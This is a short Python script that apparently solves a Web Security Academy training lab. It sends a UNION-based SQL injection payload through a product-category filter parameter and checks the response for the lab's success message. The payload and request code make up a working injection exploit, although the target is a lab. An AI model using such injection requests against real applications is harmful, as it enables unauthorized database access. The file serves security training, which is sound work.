import requests
from urllib.parse import urlparse

BASE_URL = "https://0aa900b003a3365581bea7df001b00e0.web-security-academy.net/"  # Change

session = requests.Session()

payload = "' UNION SELECT NULL, 'mCq7Xm', NULL--"  # See the payloads in the lab-notes.

print("[+] Sending SQL injection payload:", payload)

response = session.get(
    f"{BASE_URL}filter",
    params={"category": payload},
    timeout=10
)

print("[+] Injection request:", response.status_code)
print("[+] Requested URL:", response.url)

# You have to run the script more than once.
if "Congratulations, you solved the lab!" in response.text:
    print("\n[SUCCESS] Lab solved!")
else:
    print("\n[-] Success message not detected.")
    print("Check the response in your browser or Burp Suite.")

